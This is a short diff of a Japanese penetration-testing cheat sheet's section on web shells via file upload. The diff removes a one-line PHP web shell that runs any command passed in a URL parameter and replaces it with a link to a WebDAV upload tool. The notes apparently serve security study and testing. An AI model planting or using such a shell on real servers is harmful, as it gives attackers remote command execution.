@@ -92,9 +92,7 @@ Enumeration で特定した Attack Surface を、
 ---
 
 ### 🔹WebShell（File Upload）
-```
-<?php system($_GET['cmd']); ?>
-```
+- [cadaver](https://github.com/5h1n6o/Security-Tools/blob/main/cadaver/README.md)を使用してWebshellのアップロード
 
 #### 確認ポイント
 - 拡張子制限  
